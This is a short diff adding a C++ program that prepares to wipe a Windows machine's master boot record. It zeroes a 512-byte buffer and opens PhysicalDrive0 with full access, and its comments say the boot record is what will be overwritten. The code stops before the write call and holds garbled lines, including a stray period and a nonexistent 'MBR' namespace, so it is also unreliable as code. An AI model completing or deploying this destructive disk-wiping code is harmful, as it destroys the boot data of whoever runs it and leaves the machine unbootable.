@@ -1,0 +1,18 @@
+#include <string.h>
+#include <iostream>
+#include <Windows.h>
+.
+using namespace MBR;
+#define MBR_SIZE 512  // this is size of mbr , which will be 
+
+//overwritten
+ 
+ int main()
+ {
+DWORD write;
+char mbrData[MBR_SIZE];
+
+ZeroMemory(&mbrData, (sizeof mbrData));   // here we use zeromemory to fill the size of mbr with zeros. this is what we are overwriting in it.
+
+HANDLE masterbootrecord =  CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0); 
+ }
